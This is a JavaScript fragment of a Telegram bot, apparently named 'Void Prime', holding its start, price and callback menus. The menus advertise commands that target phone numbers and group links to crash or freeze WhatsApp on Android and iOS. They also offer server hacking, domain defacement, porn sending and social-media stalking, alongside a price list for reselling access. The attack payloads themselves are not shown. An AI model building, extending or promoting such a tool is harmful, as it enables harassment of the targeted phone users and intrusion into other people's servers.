      <tg-emoji emoji-id="4972319080649327590">📩</tg-emoji> 𝙰𝙳𝙼𝙸𝙽 𝙼𝙴𝙽𝚄
      <tg-emoji emoji-id="4972319080649327590">📩</tg-emoji> 𝙶𝚁𝙾𝚄𝙿 𝙼𝙴𝙽𝚄
      <tg-emoji emoji-id="4972319080649327590">📩</tg-emoji> 𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄
      <tg-emoji emoji-id="4972319080649327590">📩</tg-emoji> 𝙷𝙰𝙲𝙺𝙸𝙽𝙶 𝙼𝙴𝙽𝚄
      <tg-emoji emoji-id="4972319080649327590">📩</tg-emoji> 𝙵𝚄𝙽 𝙼𝙴𝙽𝚄
      <tg-emoji emoji-id="4972319080649327590">📩</tg-emoji> 𝙱𝚄𝙶 𝙼𝙴𝙽𝚄
      <tg-emoji emoji-id="4972319080649327590">📩</tg-emoji> 𝙼𝙾𝚁𝙴 𝙼𝙴𝙽𝚄
      <tg-emoji emoji-id="4972331312716186702">📩</tg-emoji> 𝚂𝚈𝚂𝚃𝙴𝙼 𝙼𝙰𝚁𝙺𝙴𝚁 : @Gabrieltzyproooool <tg-emoji emoji-id="5462929604278768976">📩</tg-emoji>
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
</blockquote>`,
       parse_mode: "HTML",
    reply_markup: {
  inline_keyboard: [
      [{ text: "𝙾𝚗𝚕𝚢 𝚇𝚢𝚛𝚊𝚊 𝙼𝚊𝚒𝚗", callback_data: "menuowner", icon_custom_emoji_id: "6337061216879385552", style: "danger" }], 
    [{ text: "𝙾𝚠𝚗𝚎𝚛𝙼𝚎𝚗𝚞", callback_data: "ownermenu", icon_custom_emoji_id: "5390821003209243904", style: "danger" }],      [{ text: "𝙱𝚞𝚐𝙼𝚎𝚗𝚞", callback_data: "bug", icon_custom_emoji_id: "5393451614843467174", style: "danger" }],
   [{ text: "𝙺𝚑𝚞𝚜𝚞𝚜 𝙹𝚊𝚐𝚊 𝙶𝚋", callback_data: "BokepXyraa", 
icon_custom_emoji_id: "5197531888452925507", style: "danger" }], 
      [{ text: "𝙵𝚞𝚗 & 𝙼𝚘𝚛𝚎 𝙼𝚎𝚗𝚞", callback_data: "menumore", icon_custom_emoji_id: "5465369102753229997", style: "danger" }], 
      [{ text: "𝚃𝚘𝚘𝚕𝚜𝙼𝚎𝚗𝚞", callback_data: "tools", icon_custom_emoji_id: "5305629674058061875", style: "danger" }],
    [{ text: "𝚂𝙲𝚁𝙸𝙿𝚃 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽", url: "https://t.me/wolftzyajabro", icon_custom_emoji_id: "5400303217256987122", style: "danger" }],
    [{ text: "𝙾𝚠𝚗𝚎𝚛", url: "https://t.me/Gabrieltzyproooool", icon_custom_emoji_id: "6073238044654185876", style: "danger" }], 
    [{ text: "𝚂𝚙𝚎𝚜𝚒𝚊𝚕", callback_data: "tqto", icon_custom_emoji_id: "5330504780311727774", style: "danger" }]
  ]
}
  });
});


bot.onText(/\/price/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "𝙶𝚊𝚍𝚊 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 𝚆𝚘𝚔" ;
  const premiumStatus = getPremiumStatus(senderId);
  const jidat = getCurrentDate();
  const bokepjepang = getBotRuntime();
  const randomImage = getRandomImage();
  const version = '1.5';
  const developer = 'Almas';
  const privateEffect = (chatType) => {
  return chatType === "private"
    ? { message_effect_id: "5104841245755180586" }
    : {};
};
    
  bot.sendVideo(chatId, "https://files.catbox.moe/f1reii.mp4", {

  ...privateEffect(msg.chat.type),

  caption: `<blockquote>
┏━━━━━〔 <tg-emoji emoji-id="5463079056255768637">🌟</tg-emoji> 𝚅𝙾𝙸𝙳 𝙿𝚁𝙸𝙼𝙴 <tg-emoji emoji-id="5463079056255768637">🌟</tg-emoji> 〕━━━━━┓
   システムオンライン — アクセス許可済み
   - 開発責任者 — @Gabrieltzyproooool -
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

┌── <tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> Price List All Role Void Prime
│
│ • FULL UP : 25k <tg-emoji emoji-id="5226893221191237996">👾</tg-emoji>
│ • RESELLER SC : 50k <tg-emoji emoji-id="5226893221191237996">👾</tg-emoji>
│ • PT SC : 80k <tg-emoji emoji-id="5465465194056525619">👍</tg-emoji>
│ • MOD SC : 120k <tg-emoji emoji-id="5465465194056525619">👍</tg-emoji>
│ • CEO SC : 150k <tg-emoji emoji-id="5229011542011299168">👑</tg-emoji>
│ • OWNER SC : 180k <tg-emoji emoji-id="5229011542011299168">👑</tg-emoji>
│ • SVIP SC : 250k <tg-emoji emoji-id="5228962845672096235">😈</tg-emoji>
│ • VVIP SC : 300k <tg-emoji emoji-id="5228962845672096235">😈</tg-emoji>
│ • EXECUTORVIP : 400k <tg-emoji emoji-id="5228962845672096235">😈</tg-emoji>
│ • MANAGEMENT STAFF : 550k <tg-emoji emoji-id="5253922906378881072">💋</tg-emoji>
└────────────────────────────

┌── <tg-emoji emoji-id="5420323339723881652">⚠️</tg-emoji>
│ <tg-emoji emoji-id="5210952531676504517">❌</tg-emoji> DILARANG NEGO — DP BOLEH <tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji>
└────────────────────────────
</blockquote>`,
       parse_mode: "HTML",
    reply_markup: {
  inline_keyboard: [
      [{ text: "𝙾𝚗𝚕𝚢 𝚇𝚢𝚛𝚊𝚊 𝙼𝚊𝚒𝚗", callback_data: "menuowner", icon_custom_emoji_id: "6337061216879385552", style: "danger" }], 
      
    [{ text: "𝙾𝚠𝚗𝚎𝚛𝙼𝚎𝚗𝚞", callback_data: "ownermenu", icon_custom_emoji_id: "5390821003209243904", style: "danger" }],

      [{ text: "𝙺𝚑𝚞𝚜𝚞𝚜 𝙹𝚊𝚐𝚊 𝙶𝚋", callback_data: "BokepXyraa", icon_custom_emoji_id: "5197531888452925507", style: "danger" }], 
      
      [{ text: "𝙵𝚞𝚗 & 𝙼𝚘𝚛𝚎 𝙼𝚎𝚗𝚞", callback_data: "menumore", icon_custom_emoji_id: "5465369102753229997", style: "danger" }], 
      
    [{ text: "𝙱𝚞𝚐𝙼𝚎𝚗𝚞", callback_data: "bug", icon_custom_emoji_id: "5393451614843467174", style: "danger" }],

    [{ text: "𝚃𝚘𝚘𝚕𝚜𝙼𝚎𝚗𝚞", callback_data: "tools", icon_custom_emoji_id: "5305629674058061875", style: "danger" }],

    [{ text: "𝚂𝙲𝚁𝙸𝙿𝚃 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽", url: "https://t.me/wolftzyajabro", icon_custom_emoji_id: "5400303217256987122", style: "danger" }],

    [{ text: "𝙾𝚠𝚗𝚎𝚛", url: "https://t.me/Gabrieltzyproooool", icon_custom_emoji_id: "6073238044654185876", style: "danger" }]
  ]
}

      });
});

      
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "𝙶𝚊𝚍𝚊 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 𝚆𝚘𝚔" ;
  const premiumStatus = getPremiumStatus(senderId);
  const jidat = getCurrentDate();
  const bokepjepang = getBotRuntime();
  const randomImage = getRandomImage();
  const version = '1.5';
  const developer = 'Almas';
  const privateEffect = (chatType) => {
  return chatType === "private"
    ? { message_effect_id: "5104841245755180586" }
    : {};
};
    
  bot.sendVideo(chatId, "https://files.catbox.moe/f1reii.mp4", {

  ...privateEffect(msg.chat.type),

  caption: `<blockquote>
┏━━━━━〔 <tg-emoji emoji-id="5463079056255768637">🌟</tg-emoji> 𝚅𝙾𝙸𝙳 𝙿𝚁𝙸𝙼𝙴 <tg-emoji emoji-id="5463079056255768637">🌟</tg-emoji> 〕━━━━━┓
   システムオンライン — アクセス許可済み
   - 開発責任者 — @Gabrieltzyproooool -
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

╭───〔 <tg-emoji emoji-id="6291609867203381889">😁</tg-emoji> 𝙻𝙾𝙶 𝚂𝚈𝚂𝚃𝙴𝙼 <tg-emoji emoji-id="6291609867203381889">😁</tg-emoji> 〕───╮
│ ◈ 𝙳𝙴𝚅   :: @Gabrieltzyproooool <tg-emoji emoji-id="5424816816113350289">🎁</tg-emoji>
│ ◈ 𝚂𝙲𝚁𝙸𝙿𝚃 :: 𝚅𝙾𝙸𝙳 𝙿𝚁𝙸𝙼𝙴 <tg-emoji emoji-id="5422852070438895301">🐈‍⬛</tg-emoji>
│ ◈ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 :: 𝟷.𝟶.𝟶 <tg-emoji emoji-id="5422736570178371979">🎁</tg-emoji>
│ ◈ 𝚄𝚂𝙴𝚁  :: ${username} <tg-emoji emoji-id="5422826811736228126">🎁</tg-emoji>
│ ◈ 𝚃𝙸𝙼𝙴  :: ${bokepjepang} <tg-emoji emoji-id="5425064244884305467">🎁</tg-emoji>
│ ◈ 𝙳𝙰𝚃𝙴  :: ${jidat} <tg-emoji emoji-id="5852614259082530343">🕖</tg-emoji>
│ ◈ 𝚂𝚃𝙰𝚃𝚄𝚂 :: ${premiumStatus} <tg-emoji emoji-id="5330400691779304641">🦇</tg-emoji>
╰──────────────────────╯
╭───〔 <tg-emoji emoji-id="5972010703484097419">💻</tg-emoji> 𝚇𝚈𝚁𝙰𝙰 𝙽𝙴𝚅𝙴𝚁 𝙳𝙸𝙴 <tg-emoji emoji-id="5972010703484097419">💻</tg-emoji> 〕──────╮
│ Lakukanlah semua hal yang ingin kamu lakukan, 
│ Jika Kau Bahagia Saat Melakukannya, 
│ Keinginanku sudah terkabul. 
╰─────────────────────────────────╯
╭───〔 <tg-emoji emoji-id="6300612629756906446">🖥</tg-emoji> JavaScript System Language <tg-emoji emoji-id="6300612629756906446">🖥</tg-emoji> 〕───╮
│ Use /allmenu to show all command!. 
╰─────────────────────────────────────╯
</blockquote>`,
       parse_mode: "HTML",
    reply_markup: {
  inline_keyboard: [
      [{ text: "𝙾𝚗𝚕𝚢 𝚇𝚢𝚛𝚊𝚊 𝙼𝚊𝚒𝚗", callback_data: "menuowner", icon_custom_emoji_id: "6337061216879385552", style: "danger" }], 
    [{ text: "𝙾𝚠𝚗𝚎𝚛𝙼𝚎𝚗𝚞", callback_data: "ownermenu", icon_custom_emoji_id: "5390821003209243904", style: "danger" }],      [{ text: "𝙱𝚞𝚐𝙼𝚎𝚗𝚞", callback_data: "bug", icon_custom_emoji_id: "5393451614843467174", style: "danger" }],
   [{ text: "𝙺𝚑𝚞𝚜𝚞𝚜 𝙹𝚊𝚐𝚊 𝙶𝚋", callback_data: "BokepXyraa", 
icon_custom_emoji_id: "5197531888452925507", style: "danger" }], 
      [{ text: "𝙵𝚞𝚗 & 𝙼𝚘𝚛𝚎 𝙼𝚎𝚗𝚞", callback_data: "menumore", icon_custom_emoji_id: "5465369102753229997", style: "danger" }], 
      [{ text: "𝚃𝚘𝚘𝚕𝚜𝙼𝚎𝚗𝚞", callback_data: "tools", icon_custom_emoji_id: "5305629674058061875", style: "danger" }],
    [{ text: "𝚂𝙲𝚁𝙸𝙿𝚃 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽", url: "https://t.me/wolftzyajabro", icon_custom_emoji_id: "5400303217256987122", style: "danger" }],
    [{ text: "𝙾𝚠𝚗𝚎𝚛", url: "https://t.me/Gabrieltzyproooool", icon_custom_emoji_id: "6073238044654185876", style: "danger" }], 
    [{ text: "𝚂𝚙𝚎𝚜𝚒𝚊𝚕", callback_data: "tqto", icon_custom_emoji_id: "5330504780311727774", style: "danger" }]
  ]
}
  });
});

bot.on("callback_query", async (query) => {
console.log("Callback data:", query.data);
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const bokepjepang = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const jidat = getCurrentDate();
    const randomImage = getRandomImage();
    const version = '1.5';
    const developer = 'Almas';

    let caption = "";
    let replyMarkup = {};

    if (query.data === "bug") {
      caption = `<blockquote>
╭━━━〔 <tg-emoji emoji-id="5424684827473376419">🎀</tg-emoji> 𝙰𝙻𝙻 𝙵𝙸𝚃𝚄𝚁𝙴 • 𝙱𝙴𝙱𝙰𝚂 𝚂𝙿𝙰𝙼 • 𝙰𝙽𝚃𝙸 𝙺𝙴𝙽𝙾𝙽 <tg-emoji emoji-id="5424684827473376419">🎀</tg-emoji> 〕━━━╮

<tg-emoji emoji-id="5422484648871626179">🧪</tg-emoji> ANDROID • INVISIBLE DELAY HARD
│ /xbugs      ➜ 628xxxx
│ /xkill      ➜ 628xxxx
│ /xynerx     ➜ 628xxxx
│ /zypherx    ➜ 628xxxx
│ /xivorx     ➜ 628xxxx

<tg-emoji emoji-id="5422647595635866664">🐈‍⬛</tg-emoji> ANDROID • FORCLOSE X DELAY
│ /foreclx    ➜ 628xxxx   ✗ Maintenance
│ /forexit    ➜ 628xxxx   ✗ Maintenance
│ /forcloz    ➜ 628xxxx   ✗ Maintenance
│ /fconemsg    ➜ 628xxxx

<tg-emoji emoji-id="5422870830856045306">🐈‍⬛</tg-emoji> IOS • FORECLOSE INVISIBLE ✦
│ /noctex     ➜ 628xxxx
│ /qexon      ➜ 628xxxx
━━━━━━━━━━━━━━━━━━━━━━

<tg-emoji emoji-id="5422789535715064830">🐈‍⬛</tg-emoji> BUGS GROUP • DELAY X BLANK X FC
│ /fcgc       ➜ link group ✗ Maintenance
│ /blankgc    ➜ link group
│ /delaygc    ➜ link group
┊
┊  <tg-emoji emoji-id="5429626337671281265">📍</tg-emoji> EFFECT FC GROUP :
┊  ➜ Fc Group No Click
┊  ➜ All Member Permanent Fc
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

<tg-emoji emoji-id="5422878175250119584">🐈‍⬛</tg-emoji> Tips:
│ /aktif /command     → menghidupkan command
│ /nonaktif /command  → mematikan command
│ /aktifall           → aktifkan semua command
│ /resetall           → matikan semua command
│ /cmd                → cek status command
│ ACTIVE / OFFLINE
╰━━━━━━━━━━━━━━━━━━━━━━╯
</blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔 𝚃𝚘 𝙼𝚎𝚗𝚞", callback_data: "xyra",icon_custom_emoji_id: "5411197418983160471",style: "danger"}, { text: "𝙽𝙴𝚇𝚃", callback_data: "bug2",icon_custom_emoji_id: "5409214819129653075",style: "danger"}]] };
    }
    
    if (query.data === "bug2") {
      caption = `<blockquote>
╭━━━〔 𝙱𝚄𝙶𝚂 𝚅𝙴𝚁𝚂𝙸 𝟸 〕━━━╮
│ 𝙰𝙽𝙳𝚁𝙾𝙸𝙳 • 𝙵𝚁𝙴𝚉𝙴 𝙷𝙰𝚁𝙳 𝚇 𝙸𝙽𝚅𝙸𝚂𝙳𝙴𝙻𝙰𝚈 <tg-emoji emoji-id="5397908833119010382">💋</tg-emoji>
│ /frezehard    ➜ 628xxxx (Harap Jangan Nokwa Fresh)
</blockquote>`;
      replyMarkup = { inline_keyboard: [[{ text: "𝙱𝙰𝙲𝙺", callback_data: "bug",icon_custom_emoji_id: "5330400691779304641",style: "danger", }]] };
    }
      
    if (query.data === "ownermenu") {
  caption = `<blockquote>
╭━───━⊱ ⊱⪩ <tg-emoji emoji-id="5390858914885568318">👑</tg-emoji> 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 <tg-emoji emoji-id="5390858914885568318">👑</tg-emoji> ⪨⊰
┃❏ /addsender 62xxx
┃❏ /killsession
┃❏ /addgroup &lt;add all member&gt;
┃❏ /delgroup &lt;delete acces all memb&gt;
┃❏ /aktif cmd &lt;aktifin fitur bugs&gt;
┃❏ /nonaktid cmd &lt;matikan fitur bugs&gt;
┃❏ /cmd &lt;list command&gt;
┃❏ /aktifall &lt;aktifkan all fitur sekaligus&gt;
┃❏ /resetall &lt;riset all fitur yg aktif&gt;
┃❏ /cekid
┃❏ /setjeda &lt;ᴛɪᴍᴇ&gt;
┃❏ /grouponly &lt;ᴏɴ/ᴏғғ&gt;
┃❏ /addowner &lt;ɪᴅ&gt;
┃❏ /delowner &lt;ɪᴅ&gt;
┃❏ /addprem &lt;ɪᴅ&gt;
┃❏ /delprem &lt;ɪᴅ&gt;
┃❏ /listprem &lt;ᴄᴇᴋ&gt;
╰━───────────────━❏
</blockquote>`;

  replyMarkup = {
    inline_keyboard: [[{
      text: "𝙱𝙰𝙲𝙺",
      callback_data: "xyra",
      icon_custom_emoji_id: "5411197418983160471",
      style: "primary"
    }]]
  };
}
    
      if (query.data === "menumore") {     
          caption = `<blockquote><tg-emoji emoji-id="5390858914885568318">👑</tg-emoji>°𝙲ᥣᥲⲩ - 𝚇𝚈𝚁</blockquote>
<blockquote>╔─═⊱ 𝐌𝐄𝐍𝐔 𝐌𝐎𝐑𝐄 <tg-emoji emoji-id="5467676750026660666">🎁</tg-emoji> ─═⪼
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /ping
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚃𝙴𝚂𝚃 𝙺𝙴𝙲𝙴𝙿𝙰𝚃𝙰𝙽
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /ai
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚂𝙴𝙰𝚁𝙲𝙷
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /tourl
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚄𝙱𝙰𝙷 𝙼𝙴𝙳𝙸𝙰 𝙺𝙴 𝚄𝚁𝙻
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /tiktok
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 𝚅𝙸𝙳 𝚃𝙸𝙺𝚃𝙾𝙺
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /play
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚂𝙴𝙰𝚁𝙲𝙷 𝙼𝚄𝚂𝙸𝙲
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /iqc
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙸𝙿𝙷𝙾𝙽𝙴 𝚀𝚄𝙾𝚃𝙴
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /brat
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚂𝚃𝙸𝙲𝙺𝙴𝚁 𝚃𝙴𝚇𝚃
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /bratvid
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚂𝚃𝙸𝙲𝙺𝙴𝚁 𝙰𝙽𝙸𝙼𝙰𝚂𝙸
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /stalktt
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙺𝙴𝙿𝙾𝙸𝙽 𝚃𝙸𝙺𝚃𝙾𝙺
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /stalkig
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙺𝙴𝙿𝙾𝙸𝙽 𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /asupan
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚁𝙰𝙽𝙳𝙾𝙼 𝙰𝚂𝚄𝙿𝙰𝙽
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /cekid
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙲𝙴𝙺 𝙸𝙳 𝚄𝚂𝙴𝚁
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /gta
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚄𝙱𝙰𝙷 𝙵𝙾𝚃𝙾 𝚂𝚃𝚈𝙻𝙴 𝙶𝚃𝙰
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /tofigure
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚄𝙱𝙰𝙷 𝙵𝙾𝚃𝙾 𝚂𝚃𝚈𝙻𝙴 𝙵𝙸𝙶𝚄𝚁𝙴
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /hytamkan
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚄𝙱𝙰𝙷 𝙵𝙾𝚃𝙾 𝚂𝚃𝚈𝙻𝙴 𝙷𝙸𝚃𝙰𝙼
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /disney
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚄𝙱𝙰𝙷 𝙵𝙾𝚃𝙾 𝚂𝚃𝚈𝙻𝙴 𝙳𝙸𝚂𝙽𝙴𝚈
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /anime
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚄𝙱𝙰𝙷 𝙵𝙾𝚃𝙾 𝚂𝚃𝚈𝙻𝙴 𝙰𝙽𝙸𝙼𝙴
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /cekemoji
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙲𝙴𝙺 𝙸𝙳 𝙴𝙼𝙾𝙹𝙸 𝙿𝚁𝙴𝙼𝙸𝚄𝙼
╚━═━═━═━═━═━═━═━═━═━═⪼</blockquote>`,
            replyMarkup = {
    inline_keyboard: [[{
      text: "𝙱𝙰𝙲𝙺",
      callback_data: "xyra",
      icon_custom_emoji_id: "5411197418983160471",
      style: "danger"
    }]]
  };
}
      
        if (query.data === "tools") {
  caption = `<blockquote>
╭━───━⊱ ⊱⪩ <tg-emoji emoji-id="6292081815389735688">🥷</tg-emoji> 𝚃𝙾𝙾𝙻𝚂 𝙼𝙴𝙽𝚄 <tg-emoji emoji-id="6292081815389735688">🥷</tg-emoji> ⪨⊰
┃❏ /sendbokep &lt;send bokep random 18+&gt;
┃❏ /fotbersamav1 &lt;foto bersama artis&gt;
┃❏ /tobersamav2 &lt;gabungin foto bersama&gt;
┃❏ /tofigura &lt;mengubah foto image&gt;
┃❏ /tebakpikiranku &lt;tebak pikiran acak&gt;
┃❏ /cekmati &lt;cek mati acak&gt;
┃❏ /hackvps &lt;in place&gt;
┃❏ /deface &lt;deface domain panel&gt;
┃❏ /loginvps &lt;control login vps&gt;
┃❏ /tomonyet &lt;mengubah foto image&gt;
┃❏ /todpr &lt;mengubah foto image&gt;
┃❏ /toanime &lt;mengubah foto image&gt;
┃❏ /topiramida &lt;mengubah foto image&gt;
┃❏ /topolaroid &lt;mengubah foto image&gt;
┃❏ /suitroom &lt;create room suit&gt;
┃❏ /suitjoin &lt;join room suit&gt;
┃❏ /suitstart &lt;memulai permainan&gt;
┃❏ /suitexit &lt;berhenti dalam permainan&gt;
┃❏ /startbom &lt;create room boom&gt;
┃❏ /daftar &lt;join room&gt;
┃❏ /mulai &lt;memulai room pertandingan&gt;
┃❏ /pilih &lt;memilih kotak&gt;
┃❏ /resetbom &lt;exit dari game tebak bom&gt;
┃❏ /cekid &lt;cek id telegram&gt;
╰━─────────────────━❏
</blockquote>`;

  replyMarkup = {
    inline_keyboard: [[{
      text: "𝙱𝙰𝙲𝙺",
      callback_data: "xyra",
      icon_custom_emoji_id: "5411197418983160471",
      style: "danger"
    }]]
  };
}
    
      if (query.data === "menuowner") {      
          caption = `<blockquote><tg-emoji emoji-id="5390858914885568318">👑</tg-emoji>°𝙲ᥣᥲⲩ - 𝚇𝚈𝚁</blockquote>
<blockquote>╔─═⊱ 𝐗𝐘𝐑𝐀𝐀 𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔 <tg-emoji emoji-id="5467676750026660666">🎁</tg-emoji> ─═⪼
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /maintenance
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝚂𝚈𝚂𝚃𝙴𝙼 𝙿𝙴𝚁𝙱𝙰𝙸𝙺𝙰𝙽
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /listuser
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙻𝙸𝚂𝚃 𝙳𝙰𝙵𝚃𝙰𝚁 𝚄𝚂𝙴𝚁
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /listgb
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙻𝙸𝚂𝚃 𝙶𝚁𝙾𝚄𝙿 𝚃𝙴𝚁𝙳𝙰𝙵𝚃𝙰𝚁
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /backup
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙱𝙰𝙲𝙺𝚄𝙿 𝚂𝙴𝙼𝚄𝙰 𝙵𝙸𝙻𝙴
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /bc
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃 𝚄𝚂𝙴𝚁/𝙶𝚁𝙾𝚄𝙿
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /addsaldo
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙼𝙴𝙽𝙰𝙼𝙱𝙰𝙷𝙺𝙰𝙽 𝚂𝙰𝙻𝙳𝙾
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /bcbayar
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃 𝙱𝙴𝚁𝙱𝙰𝚈𝙰𝚁 (𝙱𝚄𝙰𝚃 𝚄𝚂𝙴𝚁)
╚━═━═━═━═━═━═━═━═━═━═⪼
</blockquote>`;
     replyMarkup = {
    inline_keyboard: [[{
      text: "𝙱𝙰𝙲𝙺",
      callback_data: "xyra",
      icon_custom_emoji_id: "5411197418983160471",
      style: "danger"
    }]]
  };
}
      
    if (query.data === "tqto") {
  caption = `<blockquote>
╭━───━⊱ ⊱⪩ <tg-emoji emoji-id="5296773795091094130">💎</tg-emoji> 𝚂𝙿𝙴𝙲𝙸𝙰𝙻 𝚃𝙷𝚇 𝚃𝙾 <tg-emoji emoji-id="5296773795091094130">💎</tg-emoji> ⪨⊰
┃❏ @elyssavirellequeenn -&gt; Developer <tg-emoji emoji-id="5424816816113350289">🎁</tg-emoji>
┃❏ @celycntik -&gt; Function System <tg-emoji emoji-id="5424816816113350289">🎁</tg-emoji> 
┃❏ @elnichol_md -&gt; Apk Founder <tg-emoji emoji-id="5424816816113350289">🎁</tg-emoji>
┃❏ @alwaysZilllxy  -&gt; Tools System <tg-emoji emoji-id="5424816816113350289">🎁</tg-emoji>
┃❏ @AbsoluteTheQueen -&gt; Npc  <tg-emoji emoji-id="5422796248748948435">🎁</tg-emoji>
╰━─────────────────━❏
</blockquote>`;

  replyMarkup = {
    inline_keyboard: [[{
      text: "𝙱𝙰𝙲𝙺",
      callback_data: "xyra",
      icon_custom_emoji_id: "5411197418983160471",
      style: "danger"
    }]]
  };
}
    
      if (query.data === "BokepXyraa") {
               caption = `<blockquote>
<tg-emoji emoji-id="5390858914885568318">👑</tg-emoji>°𝙲ᥣᥲⲩ - 𝚇𝚈𝚁</blockquote>
<blockquote>╔─═⊱ 𝐌𝐄𝐍𝐔 𝐉𝐀𝐆𝐀 𝐆𝐑𝐎𝐔𝐏 <tg-emoji emoji-id="5467676750026660666">🎁</tg-emoji> ─═&gt;
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /infogb
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚂𝙸 𝙶𝚁𝙾𝚄𝙿
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /antilink
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙷𝙰𝙿𝚄𝚂 𝙻𝙸𝙽𝙺
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /antiforward
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙷𝙰𝙿𝚄𝚂 𝙿𝙴𝚂𝙰𝙽 𝚃𝙴𝚁𝚄𝚂𝙰𝙽
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /antifoto
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙷𝙰𝙿𝚄𝚂 𝙵𝙾𝚃𝙾
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /antiadmin
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙳𝙴𝙻 𝙰𝙳𝙼𝙸𝙽 𝚂𝙷𝙰𝚁𝙴
║<tg-emoji emoji-id="5260450573768990626">➡️</tg-emoji> /antipromosi
║<tg-emoji emoji-id="6046530293035176435">🔥</tg-emoji> 𝙷𝙰𝙿𝚄𝚂 𝚃𝙴𝚇𝚃 𝙿𝚁𝙾𝙼𝙾𝚂𝙸
